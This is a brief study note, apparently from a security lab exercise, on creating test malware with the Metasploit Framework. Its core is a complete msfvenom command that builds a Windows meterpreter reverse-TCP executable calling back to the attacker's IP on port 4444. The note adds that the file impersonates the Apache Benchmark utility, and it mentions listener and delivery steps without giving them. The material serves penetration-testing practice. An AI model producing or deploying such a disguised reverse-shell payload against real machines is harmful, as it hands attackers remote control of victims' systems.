To create a test malware, we need Metasploit Framework
- The Goal of this malware is to make a reverse shell and C2C so we can reference to it later

docs.rapid7.com-> To Install Malware


Things To Consider
- The attacker and Victim must be on same Network
- We Need to tell Payload toward which IP to connect back(Our IP)

*MSF venom is the utility of msf to  create payload*

$msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP) LPORT=4444 -f exe -o file.exe

This will be trusted binary default and impersonate Apache Benchmark Utility 

**For listener to our Malware, Follow**

		This will be our payload handler

The Last thing is to make sure about the delivery 

Once executed, we can easily listen to upper msf console and do the next part of the exercise
